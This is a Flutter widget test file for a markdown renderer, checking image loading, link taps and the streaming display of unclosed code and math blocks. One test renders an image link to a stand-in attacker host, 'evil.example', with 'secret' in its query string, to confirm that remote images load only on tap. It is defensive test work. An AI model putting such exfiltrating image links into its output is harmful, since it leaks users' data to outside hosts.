import 'package:everyai_markdown/everyai_markdown.dart';
import 'package:flutter/rendering.dart';
import 'package:flutter/widgets.dart';
import 'package:flutter_math_fork/flutter_math.dart';
import 'package:flutter_test/flutter_test.dart';

final MarkdownStyle style = MarkdownStyle.fallback(Brightness.light);

Widget host(Widget child) {
  return MediaQuery(
    data: const MediaQueryData(size: Size(800, 1200)),
    child: Directionality(
      textDirection: TextDirection.ltr,
      child: Align(
        alignment: Alignment.topLeft,
        child: SizedBox(width: 600, child: child),
      ),
    ),
  );
}

Future<void> pumpMarkdown(
  WidgetTester tester,
  String data, {
  bool streaming = false,
  void Function(String)? onTapLink,
}) {
  return tester.pumpWidget(host(MarkdownView(data: data, style: style, streaming: streaming, onTapLink: onTapLink)));
}

/// The style of the leaf span holding [text] in the first matching paragraph.
TextStyle? styleOfText(WidgetTester tester, String text) {
  final paragraph = tester
      .renderObjectList<RenderParagraph>(find.byType(RichText))
      .firstWhere((p) => p.text.toPlainText().contains(text));
  TextStyle? found;
  void visit(InlineSpan span, TextStyle? inherited) {
    final effective = inherited?.merge(span.style) ?? span.style;
    if (span is TextSpan) {
      if (span.text != null && span.text!.contains(text)) found = effective;
      span.children?.forEach((c) => visit(c, effective));
    }
  }

  visit(paragraph.text, null);
  return found;
}

void main() {
  testWidgets('remote images load only when tapped; data images render at once', (tester) async {
    await pumpMarkdown(tester, '![Chart](https://evil.example/p?q=secret)');
    expect(find.byType(Image), findsNothing);
    expect(find.textContaining('Load from evil.example'), findsOneWidget);
    await tester.tap(find.textContaining('Load from evil.example'));
    await tester.pump();
    expect(find.byType(Image), findsOneWidget);

    await pumpMarkdown(
      tester,
      '![Dot](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==)',
    );
    expect(find.byType(Image), findsOneWidget);
    expect(find.textContaining('Load from'), findsNothing);
  });

  testWidgets('tapping a link reports its href', (tester) async {
    final taps = <String>[];
    await pumpMarkdown(tester, '[Open docs](https://docs.dev)', onTapLink: taps.add);
    // The paragraph is full width; tap on the glyphs, then on empty space.
    final topLeft = tester.getTopLeft(find.text('Open docs'));
    await tester.tapAt(topLeft + const Offset(12, 10));
    expect(taps, <String>['https://docs.dev']);
    await tester.tapAt(topLeft + const Offset(500, 10));
    expect(taps, hasLength(1));
  });

  testWidgets('streaming renders unclosed constructs gracefully', (tester) async {
    const intro = 'Intro paragraph.\n\n';
    await pumpMarkdown(tester, '$intro```py\nprint(1)', streaming: true);
    expect(find.byType(CodeBlockView), findsOneWidget);
    expect(find.text('print(1)'), findsOneWidget);

    // An open ```math fence is a code block in progress, not broken math.
    await pumpMarkdown(tester, '$intro```math\n\\frac{1}{', streaming: true);
    expect(find.byType(CodeBlockView), findsOneWidget);
    expect(find.byType(Math), findsNothing);

    // Unclosed $$ is plain text until closed.
    await pumpMarkdown(tester, '$intro\$\$\na + ', streaming: true);
    expect(find.text('\$\$\na + '), findsOneWidget);
    await pumpMarkdown(tester, '$intro\$\$\na + b\n\$\$', streaming: true);
    expect(find.byType(Math), findsOneWidget);

    await pumpMarkdown(tester, '$intro\$\$\na + b\n\$\$', streaming: false);
    expect(find.byType(Math), findsOneWidget);
    expect(find.text('Intro paragraph.'), findsOneWidget);
  });
}
